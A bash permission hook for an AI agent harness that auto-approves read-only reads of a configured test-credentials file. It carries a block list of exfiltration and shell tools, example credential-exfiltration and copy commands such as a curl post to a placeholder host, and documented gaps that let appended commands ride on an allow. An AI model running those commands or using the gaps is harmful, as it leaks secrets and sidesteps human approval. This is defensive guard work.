#!/usr/bin/env bash
# allow-qa-credentials-read.sh — PreToolUse guard for Bash: auto-allow READ-ONLY
# inspection of the gitignored test-account credentials file the interactive-test
# phase signs in with. It emits `allow` or NOTHING — it never denies and never
# asks.
#
# WHY IT EXISTS, AND WHOSE READ IT IS. Only the interactive-test agent reads the
# file named by `qa.credentialsPath`. The flow that dispatches it does not —
# `instructions/qa_test_instructions.md` states that flow "does **not** parse the
# keys or pass them in" — so there are not two sides to this read. Nor does the
# corpus spell any BASH command for it: `agents/qa-tester.md` says to read the
# file directly and leaves the tool and the spelling to the agent, and the one
# in-tree parser, `scripts/reserve-qa-user.sh`, reads the file from INSIDE a
# script, so no Bash command string ever names it and this guard never sees it.
# What is left for this guard is the AD-HOC read: whatever `cat` / `grep` /
# `head` spelling that agent picks, plus whatever an adopter's own prompts issue.
# Two such shapes get no allowance anywhere else — a SINGLE statement naming a
# path only the configuration knows (`cat <creds path>`), which no static allow
# list can spell and which the sibling `allow-safe-compounds.sh` never sees
# because it is not a compound; and a `;`-joined compound opening with a shell
# assignment (`f=<creds path>; grep … "$f"`), which that sibling cannot approve
# because an assignment matches no safe prefix. Interactively each costs a
# prompt; in an unattended run an unanswerable prompt is a stall.
#
# THAT JUSTIFICATION IS AD-HOC, SO THE COST BELOW IS RE-DECIDED ON IT. This is
# the one guard with no literal prefilter, which makes it the one paying
# subprocesses on every Bash call in every session the plugin is enabled for. It
# is KEPT, on two grounds: it is what makes `qa-tester.md`'s prompt-free read
# true whenever the agent spells that read in Bash, and the cost is bounded and
# disclosed under WHAT THAT COSTS below. If a later revision pins that read to
# the Read tool, which needs no allowance from here, this guard's justification
# goes with it and the guard should be REMOVED rather than kept on inertia.
#
# WHAT IT KEYS ON IS CONFIGURATION, NOT A FILE NAME. The string comes from the
# adopter's `qa.credentialsPath`, and the match is EQUALITY against that path's
# BASENAME, taken from a WORD of the piece, so a command that spells the file
# relatively and one that spells it absolutely are both recognised. Keying on a
# literal credentials file name would bind the guard to one project: no file name
# is written in this file, and a repository that configures a different path gets
# no allowance for this one.
#
# EQUALITY, AND THE ONE THING IT STILL ADMITS. An earlier revision tested the
# whole piece for the basename as a SUBSTRING, which admitted a family rather
# than a file: `<creds base>.bak`, `<creds base>X` and
# `/tmp/notes-<creds base>-draft` were each measured `allow` under a reason
# string naming the CONFIGURED file — the last of them a path outside the
# repository entirely. The word's basename is now compared for equality and all
# three are SILENT (`docs/guard-verification.md` §3.1, N108–N110). What equality
# still admits is a DIFFERENT file whose basename IS the configured one
# (`/tmp/<creds base>`, measured `allow`): resolving that away needs the piece's
# own working directory, which no guard can know, and the attempt would lose
# `cd <dir> && cat <creds base>`. The grant is bounded to the read-only commands
# in `CREDS_READ_COMMANDS`, and it is residual (l) in that document's §2.4.
#
# THE REFUSED TOKENS. Within jurisdiction, and even on a command that does name
# the configured file, this guard stays silent when the command could:
#   - MUTATE the file, or WRITE
#     A SECOND CLEARTEXT COPY OF IT
#                                (`rm`, `mv`, `cp`, `tee`, `dd`, `truncate`,
#                                 `sort` (`-o`), `uniq` (second operand),
#                                 `chmod`, `ln`, `sed`, … )
#   - EXFILTRATE it              (`curl`, `wget`, `nc`, `ssh`, `scp`, `mail`,
#                                 `pbcopy`, `base64`, … )
#   - HAND IT TO AN INTERPRETER  (`sh`, `bash`, `zsh`, `env`, `xargs`, `awk`,
#                                 `python`, `perl`, `ruby`, `node`, `deno`,
#                                 `bun`, `osascript`, `eval`, `exec`, … )
# It is scanned against the WHOLE command string rather than piece by piece, so a
# token hidden inside a `$(…)` substitution is caught too. `hc_split_command`
# splits on neither a pipe nor a balanced `$(…)`, so this scan is also the only
# thing standing between `cat <creds path> | <anything>` — or
# `cat <creds path> $(<anything>)` — and an allow, and it reaches exactly as far
# as the token list does. That is why the shells, `env`, `xargs`, `awk`, `sed`,
# `sort` and `uniq` are on it: each names a shape that reaches the credentials
# file through it — `cat <creds path> | sh` and its `zsh` twin,
# `bash <script> <creds path>`, `sh -c '…'`, `env FOO=1 cat <creds path>`,
# `xargs -a <creds path>`, `awk … <creds path>` and `sed -i.bak … <creds
# path>`, the last a mutation the first bullet already claimed, and
# `cat <creds path> | sort -o <out>` / `| uniq - <out>`, which write the second
# cleartext copy from the tail the split does not reach. The last two are on the
# scan rather than merely off `CREDS_READ_COMMANDS` because keeping them off
# that constant refuses them only in COMMAND position: a piece-level refusal
# closes four spellings, and the capability is closed only where `cp`, `tee`,
# `dd` and `truncate` close theirs, which is here. Nothing on the list is
# specific to any one project or stack, and an addition to it is a security
# change, not a stylistic one.
#
# WHERE THE TOKEN SCAN IS THE *ONLY* REFUSAL, MEASURED RATHER THAN ASSUMED. Drive
# the guard-verification shape set with the added names taken back out and only
# the tail shapes move — `cat <creds path> | sh` and its `zsh` twin, and, since
# `sort` and `uniq` joined the list, `cat <creds path> | sort -o <out>`,
# `| uniq - <out>`, the two bare `| sort` / `| uniq` cost rows and the
# substitution spelling. Every other shape those names cover
# (`bash <script> <creds path>`, `sh -c '…'`, `xargs -a`, `awk`, `sed -i`,
# `env FOO=1 cat`, and `sort -o` / `uniq <in> <out>` in COMMAND position) is
# refused a second time by the read-command test on the piece. So the scan is
# load-bearing where the split does not reach and defence in depth everywhere
# else — which is the right way round.
# `hc_split_command` reads `&&`, `||`, `;` and a bare `&`, so neither a pipe nor
# a balanced `$(…)` starts a piece: a tail appended with either stays inside the
# piece that was allowed, and the whole-string token scan is the only refusal
# standing over BOTH shapes, reaching exactly as far as its token list does.
#
# NO REDIRECTION, ANYWHERE IN THE COMMAND. A `>` or `>>` anywhere silences the
# command, whatever it points at. An earlier revision refused only a redirection
# whose target was the credentials file itself and called a bare `>` elsewhere a
# deliberate non-refusal, on the grounds that it kept a `sed`/`awk` redacted-print
# idiom out of a prompt; measured, that non-refusal also auto-approved
# `cat <creds path> > <anywhere else>` — a copy of the cleartext file to an
# arbitrary path, which is the capability the `cp` token is on the list to
# withhold — and, through the assignment shape above, `f=<creds path>; cat "$f" >
# <anywhere else>`, where no piece names the file at all. The idiom that paid for
# it is spelled nowhere in the shipped corpus. The blanket refusal is strictly
# stricter than the old pattern, so it silences no command the old one allowed,
# and it costs a redirect-bearing spelling such as `2>/dev/null` one prompt.
#
# THE ALLOW IS ALL-OR-NOTHING OVER EVERY PIECE. A PreToolUse `allow` covers the
# WHOLE Bash call, so testing only that the command MENTIONS the configured
# basename grants everything appended to it: `cat <creds path> && git push
# <remote> <branch>` was measured `allow`, auto-approving a push the adopter's
# profile keeps on `ask`, under a reason string that called the grant "Read-only
# inspection". A permission `deny` cannot catch that either, because a profile
# deny is anchored at the START of the command string and never fires on an
# occurrence nested inside a compound. Every piece of `hc_split_command` is
# therefore judged before anything is granted, and one unjudgeable piece silences
# the whole command — the rule both sibling allow-only guards already use.
#
# EVERY PIECE, BUT EACH JUDGED BY ITS LEADING WORDS. `hc_split_command` reads
# `&&`, `||`, `;` and a bare `&` and nothing else, so a pipe and a balanced
# `$(…)` never start a piece: appended to a read of the credentials file they
# stay inside that piece and ride along on its allow — `cat <creds path> $(git
# push <remote> <branch>)` is measured `allow`, the same push the row above is
# about. What stands in their way is the whole-string token scan under `THE
# REFUSED TOKENS`, which stops at that list. This is the limit
# `allow-safe-compounds.sh` states under `PREFIX MATCHING IS EXACTLY THAT`, and
# it is recorded as residual (k) in `docs/guard-verification.md` §2.4 rather
# than closed. The same two shapes on `autonomous-script-allowlist-guard.sh` —
# §2.4's (j) — ARE closed there, by a whole-string scan for the shell's
# composition grammar that refuses on a construct's PRESENCE and inspects no
# tail. That scan is a list of CONSTRUCTS; this one is a list of BINARIES, so the
# residual here is exactly the set of tails naming no refused binary — a set
# the `sort` / `uniq` addition made two binaries smaller, because a tail that
# writes a second cleartext copy of the credentials file is the one thing the
# residual may not contain. Why the two differ is under `WHY NOT THE TWIN'S
# TOKEN LIST` in that guard's header.
#
# A PIECE THAT NAMES THE CREDENTIALS FILE MUST *READ* IT. Such a piece is not
# judged against `hc_safe_prefixes`: that set matches leading words only, so its
# `find` entry would carry `find <creds path> -delete` (measured `allow` before
# this) and its `sed` entry the `-i` spellings. The piece must instead LEAD with
# one of `CREDS_READ_COMMANDS` below, or be a bare shell assignment, which runs
# nothing at all. Every OTHER piece goes through the same `hc_safe_prefixes` /
# `hc_path_anchored_patterns` / `hc_piece_is_never_safe` / `hc_torn_substitution`
# tests, in the same order, that `allow-safe-compounds.sh` applies — deliberately,
# so the two guards cannot drift into judging the same piece differently, and so
# `cd <repo> && cat <creds path>` keeps working through the `cd` arm rather than
# through a special case here.
#
# CONTROL FLOW FALLS THROUGH, as it does in `allow-safe-compounds.sh` and for the
# same reason: splitting `if [ -f "$f" ]; then cat "$f"; fi` on `;` yields pieces
# leading with `if`, `then` and `fi`, none of which is a read command or a safe
# prefix. That costs one prompt on an exit-code-gated block, and the shipped
# instruction corpus already tells an unattended flow to issue two separate
# single statements rather than one.
#
# THE PREFIX SETS ARE RESOLVED LAZILY, and a command whose every piece names the
# credentials file never resolves them at all — see `load_prefix_sets`. A failure
# there withholds the whole allow rather than falling back to anything.
#
# THE TRADE-OFF THE ADOPTER ACCEPTS. This DOES auto-approve commands that print
# the cleartext value into the transcript (`echo "PW=$(grep … <creds file>)"`).
# It is accepted here because it is what keeps the flow frictionless. Opting out
# is by configuration, not by removing the hook: hooks ship as one plugin
# manifest, so an adopter cannot remove this hook's entry on its own. Instead the
# allowance is scoped twice — it exists only while `phases.qa` is `true` AND
# `qa.credentialsPath` is set. An adopter who does not want it leaves the
# interactive-test phase off, or leaves the path unset; either one makes this
# guard silent everywhere, and the ordinary permission prompt returns.
#
# FAIL-CLOSED TABLE — an allow-only guard fails closed by staying SILENT, not by
# answering something else. Silence defers to the permission profile, which still
# prompts for whatever it would have prompted for. Every row below is a
# condition under which it declines to decide. It emits `allow` only on a word
# whose basename EQUALS the configured one — never on a path that merely carries
# that basename as a prefix or an infix; the one thing equality cannot tell apart
# is a same-named file in another directory, disclosed under `EQUALITY, AND THE
# ONE THING IT STILL ADMITS` above rather than claimed away here:
#
#   payload does not parse, or `jq` is absent   -> silent (no command to judge)
#   command carries `>` or `>>` anywhere        -> silent
#   command carries a refused token             -> silent
#   anchor is not inside a git repository       -> silent
#   repository has no harness.config.json       -> silent (no jurisdiction)
#   configuration unreadable or invalid JSON    -> silent (`hc_get` returns 1)
#   `phases.qa` is not `true`                   -> silent (phase is off)
#   `qa.credentialsPath` absent or empty        -> silent (nothing to key on)
#   no word of the command has that file's
#     basename as its own basename              -> silent (not our concern)
#   any piece carries a torn `$(`               -> silent (its leading words say
#                                                  nothing about what runs)
#   any piece is one `hc_piece_is_never_safe`
#     refuses whatever else it matches          -> silent
#   a piece NAMING the file does not lead with
#     a read command and is not a bare
#     assignment                                -> silent (names it without
#                                                  reading it)
#   a piece naming the file NOWHERE is not a
#     safe prefix and not a path-anchored arm   -> silent
#   the prefix sets will not resolve, once such
#     a piece needs them                        -> silent (never a fallback set)
#   no piece named the file after cleaning      -> silent (nothing to grant)
#   otherwise                                   -> allow
#
# JURISDICTION IS A DELIBERATE SCOPING DECISION. A repository with no
# `harness.config.json` at its resolved root has not adopted the harness, so this
# guard grants nothing there — a plugin hook fires in EVERY session the plugin is
# enabled for, including repositories that never ran `init`. The repository is
# resolved from the command the hook was handed (the first `git -C <dir>`, else a
# leading `cd <dir>`, else the payload's own `.cwd`, else `$PWD`) — never from a
# path written in this file — so one registration serves every checkout and every
# sibling worktree.
#
# NO LITERAL PREFILTER IS AVAILABLE HERE, AND THAT FOLLOWS FROM THE PORT. Sibling
# guards screen the raw payload for a fixed byte sequence (`commit`, `push`, `rm`)
# before spawning anything, because the word they key on is fixed. The word this
# one keys on is the adopter's configured file name, unknown until the
# configuration has been read; and every payload carries the session's own `cwd`,
# so a filter on generic path bytes would pass every payload and buy nothing. What
# runs first instead is the cheapest work that is still config-independent: the
# payload decode every guard needs, then the fork-free redirection `case`, then
# the token scan — one `grep`, no `git` and no configuration read — so a command
# carrying a redirect or a refused token is silenced before the repository is
# resolved. Running those two ahead of the file-name match rather than after it
# changes no outcome: both orders end in the same silence, and neither can reach
# the `allow`.
#
# WHAT THAT COSTS, AND WHY THE COST IS ACCEPTED RATHER THAN UNNOTICED. The
# paragraph above is an argument about OUTCOMES, and for a long time nobody
# costed it. Having no prefilter means this guard is the one that does real work
# on EVERY Bash call in every session the plugin is enabled for — including on
# `ls`, and including in repositories that never adopted the harness. Its four
# subprocesses are: one `jq` (both payload fields at once), one `grep` (the token
# scan), one `git rev-parse --show-toplevel` (the repository), and one `jq` (the
# whole configuration, cached for the process) — the first three
# config-independent, which is what "no prefilter" costs. The piece walk adds
# nothing to that: it runs only after the basename match, and its two extra `jq`
# are `load_prefix_sets`, paid only by a command that both names the configured
# file and carries a piece that does not.
# Measured on `/bin/bash` 3.2 / macOS, 20–40 iterations against a reference
# fixture and a one-piece command, the guard costs ~27 ms end to end, of which
# ~7 ms is the `git rev-parse`, ~7 ms is bash startup plus sourcing the shared
# library, and the two `jq` calls and the `grep` are ~1.5 ms each. Reproduce with
# the REPRO payload below and `time`; the standing grid lives with the guard
# verification docs, not here, because a number in a header goes stale silently.
#
# THE `git rev-parse` STAYS, DELIBERATELY. The obvious further narrowing —
# resolve the repository only for a command that carries a `/`- or `.`-bearing
# token — is a GUESS ABOUT THE FILE NAME wearing a different hat. `schemas`
# constrains `qa.credentialsPath` to a non-empty string and nothing more, so an
# adopter may configure `creds`; that filter would then silently withhold the
# allowance for `cat creds`, which is the no-fallback-file-name rule below the
# configuration reads applied to the wrong end of the decision — a file name this
# guard invented, deciding a command about the one the adopter configured.
# ~7 ms per Bash call is the price of keying on configuration
# instead of on a file name, and it is paid here rather than passed to the
# adopter as a surprise. What DID come off the cost without touching a single
# decision is everything in the library: the per-key `jq` storm and the
# `printf | sed` parsers (see the config cache and the parser notes in
# `lib/harness-config-lib.sh`).
#
# WHY `set -f`. Filename expansion is disabled for the whole script as a
# prophylactic: nothing here expands a variable in a word-splitting position
# today, but a piece of a command string must never be expanded against the
# filesystem, and a sibling guard had exactly that defect. `set -f` does NOT
# affect `case` pattern matching.
#
# REPRO — reproduce any decision by hand; the payload goes in on stdin. <repo> is
# a checkout that has adopted the harness with `phases.qa: true` and
# `qa.credentialsPath: "<creds path>"` (a repo-relative path, e.g.
# `.secrets/test-accounts.env`):
#
#   printf '{"tool_input":{"command":"cat <creds path>"},"cwd":"<repo>"}' \
#     | bash plugin/hooks/allow-qa-credentials-read.sh
#
#   ALLOW (prints one JSON object carrying permissionDecision "allow") — same
#   payload shape, differing only in the "command" string:
#
#     cat <creds path>                            plain read
#     grep -E '^ACCOUNT_1' <creds path>           …and the other read commands
#     f=<repo>/<creds path>; grep -E '^ACCOUNT_1' "$f"
#                                                 bare assignment, then a piece
#                                                 naming no file and matching a
#                                                 safe prefix
#     cd <repo> && cat <creds path>               path-anchored `cd` arm
#     cat <creds path> && git status              a safe prefix beside the read
#     echo "PW=$(grep … <creds path>)"            the disclosed transcript print
#     cat <creds path> $(<anything not a refused token>)
#                                                 the ride-along the split does
#                                                 not reach (residual, above)
#     cat /tmp/<creds base>                       a DIFFERENT file whose basename
#                                                 is the configured one: what
#                                                 basename equality still admits
#                                                 (residual (l), above)
#
#   NO OUTPUT, exit 0 — the file is named and something else is wrong:
#
#     cp <creds path> /tmp/x                      mutation token
#     curl -d @<creds path> https://example.invalid
#                                                 exfiltration token
#     node -e "…readFileSync('<creds path>')"     interpreter token
#     cat <creds path> | sh                       …and the shells, which the pipe
#                                                 makes this scan's business
#     sh -c 'cat <creds path>'                    …however they are spelled
#     xargs -a <creds path> echo                  `xargs`
#     awk '{print}' <creds path>                  `awk`
#     sed -i.bak 's/a/b/' <creds path>            `sed`, a mutation
#     env FOO=1 cat <creds path>                  `env`
#     echo x > <creds path>                       redirection onto the file
#     cat <creds path> > /tmp/x                   …and to anywhere else
#     f=<creds path>; cat "$f" > /tmp/x           …including behind the variable
#     grep … <creds path> 2>/dev/null             …the cost of the blanket rule
#     find <creds path> -delete                   names the file without reading
#                                                 it: `find` is not a read command
#     sort -o /tmp/x <creds path>                 `sort` writes a file, so it is
#                                                 not a read command either
#     sort --output=/tmp/x <creds path>           …however the option is spelled
#     sort -o <creds path> <creds path>           …including onto the file itself
#     uniq <creds path> /tmp/x                    `uniq` writes its second operand
#     cat <creds path> | sort -o /tmp/x           …and behind the pipe, which
#     cat <creds path> | uniq - /tmp/x            the split does not reach:
#                                                 refused tokens, not merely
#                                                 absent from the read set
#     cat <creds path> | sort                     …the cost that buys those two
#     cat <creds path> && git push <remote> <branch>
#                                                 the ride-along: a second piece
#                                                 matching no safe prefix
#     if [ -f <creds path> ]; then cat <creds path>; fi
#                                                 control flow falls through
#     sed -n 's/=.*/=<redacted>/p' <creds path>   the redacted-print idiom the old
#                                                 header protected: refused twice
#                                                 over, as a token and as a piece
#                                                 leading with no read command
#     cat <some other>.env                        a file the config does not name
#     cat <creds path>.bak                        …including one the configured
#     cat <creds path>X                           basename is a PREFIX of, and
#     cat /tmp/notes-<creds base>-draft           one it is an INFIX of, outside
#                                                 the repository: each was
#                                                 `allow` under the old substring
#                                                 match and is SILENT under
#                                                 basename equality
#     any of the above in a <repo> with `phases.qa` false or the path unset
#     any of the above in a <repo> whose config is invalid JSON
#     any of the above in a <repo> with no harness.config.json

set -u
set -f

. "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/harness-config-lib.sh"

payload=$(cat)

# ONE `jq` for both payload fields — see `hc_payload_fields`. This guard has no
# literal prefilter to run first (see the header), so this is its first
# subprocess, and reading `.cwd` here rather than after the token scan is what
# makes it the ONLY payload fork rather than one of two.
hc_payload_fields "$payload" || exit 0
cmd="$HC_PAYLOAD_CMD"

# No redirection anywhere, whatever it targets — see the header. Config-
# independent and fork-free, so it runs ahead of even the token scan.
case "$cmd" in
  *'>'*) exit 0 ;;
esac

# Refuse to auto-approve anything that could mutate the file, exfiltrate it over
# the network, or hand it to an interpreter — including a shell, which a pipe
# would otherwise reach, since `hc_split_command` never splits on `|`. Config-
# independent, so it runs before the repository and the configuration are
# resolved. Scans the whole string, so tokens hidden inside `$(…)` are caught too.
#
# `env` carries its own alternative because its left boundary has to be narrower
# than the others': a credentials file is very often named `<something>.env`, and
# the shared `[^[:alnum:]_]` boundary would match the file's own suffix and
# silence this guard for every such adopter. Excluding `.` and `-` there keeps
# `<name>.env` and `<name>-env` out while still matching `env` in command
# position. A path spelling (`/usr/bin/env x`) is missed by that arm and caught by
# whatever `x` is, or by the read-command test on the piece.
#
# `sort` and `uniq` take the SHARED boundary rather than `env`'s narrow one, and
# that costs a collision worth naming: an adopter whose `qa.credentialsPath`
# basename carries either as a boundary-delimited word (`qa-sort.env`) gets no
# allowance from this guard at all — measured, every read of that file goes
# SILENT. The narrow boundary would buy the collision back and lose
# `cat <creds path> | /usr/bin/sort -o <out>` with it, which is the capability
# the two names are here for. Silence is the fail-closed direction and the
# ordinary permission prompt still runs, so the collision is disclosed rather
# than bought back.
if printf '%s' "$cmd" | grep -Eq '(^|[^[:alnum:]_])(rm|rmdir|mv|cp|tee|dd|truncate|sort|uniq|chmod|chown|chgrp|ln|curl|wget|nc|ncat|netcat|ssh|scp|sftp|ftp|telnet|socat|python|python3|perl|ruby|node|deno|bun|osascript|eval|exec|base64|xxd|openssl|mail|sendmail|launchctl|pbcopy|sh|bash|zsh|ksh|dash|fish|csh|tcsh|xargs|sudo|su|nohup|setsid|awk|gawk|nawk|mawk|sed)([^[:alnum:]_]|$)|(^|[^[:alnum:]_./-])env([^[:alnum:]_]|$)'; then
  exit 0
fi

cwd="$HC_PAYLOAD_CWD"

# The repository this command operates on, resolved by the library's settled
# order — the anchor for jurisdiction and for the configuration read below.
top=$(hc_resolve_repo_root "$cmd" "$cwd") || exit 0

# Jurisdiction: no config at that root means the harness was never adopted here,
# so there is nothing for this guard to grant.
hc_config_file "$top" >/dev/null || exit 0

# Warm the per-process configuration cache HERE, in this shell: every reader
# below runs inside a `$(…)` subshell, which inherits the cache but cannot
# write one back. Decides nothing — see the cache header in the library.
hc_config_load "$top" || :

# Both gates come from the adopter's configuration, and either one being absent —
# or the configuration being unreadable at all — ends in silence. There is no
# fallback file name — the guard invents none, and an absent configuration ends
# the run rather than standing in a default. What the basename it DOES read
# cannot distinguish is under `EQUALITY, AND THE ONE THING IT STILL ADMITS`.
qa_phase=$(hc_get "$top" '.phases.qa') || exit 0
[ "$qa_phase" = "true" ] || exit 0

creds_path=$(hc_get "$top" '.qa.credentialsPath') || exit 0
creds_base=${creds_path##*/}
[ -n "$creds_base" ] || exit 0

# Must reference the configured credentials file, else not our concern. This is a
# cheap SUPERSET test and nothing more — a fork-free `case` that ends the run for
# a command the basename does not occur in at all. It is deliberately NOT the
# match: `piece_names_creds` decides that, per word and by equality, and a
# command that reaches it carrying only a `<creds base>`-bearing lookalike sets
# `found_creds` nowhere and ends silent. Widening this test would decide nothing;
# narrowing it to equality here is impossible, because a piece may spell the file
# relatively or absolutely. The quotes make the pattern a literal, not a glob.
case "$cmd" in
  *"$creds_base"*) ;;
  *) exit 0 ;;
esac

# ---------------------------------------------------------------------------
# The commands a piece NAMING the credentials file may lead with. Every one of
# them writes only to standard output — none has an option or an operand that
# names a file to write into: this is the "read-only inspection" the reason
# string promises, spelled out. It is deliberately NOT
# `hc_safe_prefixes` — that set matches leading words only, so `find` there would
# carry `find <creds path> -delete` and `sed` its `-i` spellings.
#
# The entries are bare command names, one per line, because `creds_piece_ok`
# compares a whole line to a piece's first word — a trailing comment on one of
# these lines would stop it matching.
#
# NOT HERE, DELIBERATELY: `find` (`-delete`, `-exec`), `jq`, `sed` and `awk` (the
# last two are refused tokens outright), and anything that opens a subshell.
# `sort` and `uniq` WERE here and were removed — and removing them from this
# constant was NOT enough. `sort -o <file>` / `--output=<file>` and
# `uniq <in> <out>` write a second cleartext copy wherever the caller names,
# including back onto the file itself, which is the exact capability `cp`,
# `tee`, `dd` and `truncate` sit on the refused-token list to withhold; taking
# them off this constant refuses them only in COMMAND position, and `cat <creds
# path> | sort -o <out>` was measured `allow` behind the pipe the split does not
# read. So the two names are on the WHOLE-STRING scan as well, which is where
# `cp` / `tee` / `dd` / `truncate` are refused and is what makes that comparison
# hold. Neither is spelled anywhere in the shipped corpus, and readmitting
# either costs an option walk refusing every abbreviation of `-o` / `--output`,
# which is the enumerate-the-refused game `hc_piece_is_never_safe` argues
# against. The rows are in the REPRO NO-OUTPUT block, and the decision is
# recorded in the guard-verification docs, `Disclosed residuals, re-confirmed`.
# An addition here widens what may touch the cleartext credentials file and is a
# security change.
# ---------------------------------------------------------------------------

CREDS_READ_COMMANDS="
cat
grep
egrep
fgrep
head
tail
wc
cut
ls
echo
printf
"

# 0 when some WORD of <piece> is a path whose BASENAME is EXACTLY the configured
# file's. Equality on the word's basename, never a substring of the piece: an
# unanchored `*"$creds_base"*` matched every path carrying that basename as a
# prefix or an infix, so `<creds base>.bak`, `<creds base>X` and
# `/tmp/notes-<creds base>-draft` were each routed here and each measured `allow`
# under a reason string naming the CONFIGURED file — a read of an arbitrary path
# outside the repository, reported as a read of the credentials file.
#
# The word is normalised the way the surrounding code already normalises one:
# surrounding shell punctuation is peeled (the `)"` tail of the disclosed
# transcript-print shape lands on a word), then an assignment prefix (`f=<path>`,
# the opening piece of the assignment-first shape), then `##*/` for the basename.
# Anything the peel cannot reduce to the configured basename returns non-zero and
# the piece falls through to `is_safe` — an unparsable word never becomes a
# credentials read.
#
# WHAT EQUALITY STILL ADMITS, DELIBERATELY: a DIFFERENT file whose basename is
# the configured one (`/tmp/<creds base>`). Keying on the basename is what makes
# the relative and the absolute spelling of the configured file one pattern, and
# a per-piece resolution would need the piece's own working directory, which no
# guard can know — `cd <dir> && cat <creds base>` is the shape that breaks. The
# grant is bounded to `CREDS_READ_COMMANDS`, so it is a read-only inspection
# mislabelled by the reason string rather than a new capability; it is residual
# (l) in `docs/guard-verification.md` §2.4 and is disclosed in the header rather
# than claimed away.
piece_names_creds() {
  local rest="${1-}" word name base
  while [ -n "$rest" ]; do
    word=${rest%%[[:space:]]*}
    case "$rest" in
      *[[:space:]]*) rest=${rest#*[[:space:]]} ;;
      *) rest="" ;;
    esac
    [ -n "$word" ] || continue

    while :; do
      case "$word" in
        [\"\'\`\(\<]*) word=${word#?} ;;
        *) break ;;
      esac
    done
    while :; do
      case "$word" in
        *[\"\'\`\)\;\,]) word=${word%?} ;;
        *) break ;;
      esac
    done
    [ -n "$word" ] || continue

    case "$word" in
      [A-Za-z_]*=*)
        name=${word%%=*}
        case "$name" in
          *[!A-Za-z0-9_]*) ;;
          *) word=${word#*=} ;;
        esac
        ;;
    esac

    base=${word##*/}
    [ "$base" = "$creds_base" ] && return 0
  done
  return 1
}

# 0 when <piece> is a CREDENTIALS READ: a bare shell assignment (`f=<creds
# path>`), which runs nothing at all and is the opening piece of the
# assignment-first ad-hoc shape the header describes, or a piece whose FIRST word
# is one of the read commands above. One layer of quotes is peeled off that word first, so a quoted spelling
# resolves identically to a bare one.
creds_piece_ok() {
  local piece="${1-}" first name entry
  first=${piece%%[[:space:]]*}
  first=${first#\"}; first=${first%\"}
  first=${first#\'}; first=${first%\'}

  case "$first" in
    [A-Za-z_]*=*)
      name=${first%%=*}
      case "$name" in
        *[!A-Za-z0-9_]*) ;;
        # A bare assignment is the WHOLE piece: `f=<creds path> cat "$f"` is a
        # command with an assignment prefix, not an assignment.
        *) [ "$first" = "$piece" ] && return 0 ;;
      esac
      ;;
  esac

  while IFS= read -r entry; do
    [ -n "$entry" ] || continue
    [ "$first" = "$entry" ] && return 0
  done <<EOF
$CREDS_READ_COMMANDS
EOF
  return 1
}

# ---------------------------------------------------------------------------
# The two prefix sets a piece naming NO credentials file is judged against,
# resolved LAZILY. A command whose every piece names the file never needs them —
# `cat <creds path>`, the commonest shape by far, is one such — and resolving
# them eagerly would add two `jq` passes to every allow. A failure here withholds
# the whole allow: a broken configuration must never widen what auto-allows.
# ---------------------------------------------------------------------------

safe_prefixes=""
path_anchored_patterns=""
prefix_sets_loaded=0

load_prefix_sets() {
  [ "$prefix_sets_loaded" = 1 ] && return 0
  safe_prefixes=$(hc_safe_prefixes "$top") || return 1
  path_anchored_patterns=$(hc_path_anchored_patterns "$top") || return 1
  prefix_sets_loaded=1
  return 0
}

# Such a piece is safe on exactly the terms `allow-safe-compounds.sh` uses:
# empty, a path-anchored arm, or a safe prefix by leading words — and never one
# of the shapes no allow-only guard may vouch for. Kept deliberately identical to
# that guard's `is_safe` so the two cannot drift into judging the same piece
# differently.
is_safe() {
  local piece="${1-}" prefix rewritten
  [ -n "$piece" ] || return 0
  hc_piece_is_never_safe "$piece" && return 1
  load_prefix_sets || return 1
  if hc_matches_any_pattern "$piece" "$path_anchored_patterns"; then
    return 0
  fi
  rewritten=$(hc_git_piece_in_workspace "$piece" "$top") \
    || rewritten=$(hc_runner_piece_in_workspace "$piece" "$top") \
    || rewritten=""
  while IFS= read -r prefix; do
    [ -n "$prefix" ] || continue
    case "$piece" in
      "$prefix"|"$prefix "*) return 0 ;;
    esac
    if [ -n "$rewritten" ]; then
      case "$rewritten" in
        "$prefix"|"$prefix "*) return 0 ;;
      esac
    fi
  done <<EOF
$safe_prefixes
EOF
  return 1
}

# ---------------------------------------------------------------------------
# The decision. EVERY piece is judged before anything is granted, because the
# `allow` covers the whole Bash call: a piece naming the credentials file is a
# read of it or nothing, and a piece naming it nowhere goes through exactly the
# tests `allow-safe-compounds.sh` applies. One unjudgeable piece silences the
# whole command.
#
# `hc_torn_substitution` runs FIRST, on the RAW piece, because `hc_clean_piece`
# peels a legitimate trailing `)` and would make a balanced substitution look
# torn — and a torn piece's leading words say nothing about what actually runs.
# ---------------------------------------------------------------------------

found_creds=0
while IFS= read -r piece; do
  hc_torn_substitution "$piece" && exit 0
  piece=$(hc_clean_piece "$piece")
  [ -n "$piece" ] || continue
  hc_piece_is_never_safe "$piece" && exit 0
  if piece_names_creds "$piece"; then
    creds_piece_ok "$piece" || exit 0
    found_creds=1
  else
    is_safe "$piece" || exit 0
  fi
done <<EOF
$(hc_split_command "$cmd")
EOF

[ "$found_creds" = 1 ] || exit 0

jq -nc --arg p "$creds_path" '{
  hookSpecificOutput: {
    hookEventName: "PreToolUse",
    permissionDecision: "allow",
    permissionDecisionReason: ("Read-only inspection of the configured credentials file " + $p + ": every piece of this command either reads that file with a read-only command or matches the safe-prefix set, and none redirects (interactive-test phase)")
  }
}'

exit 0
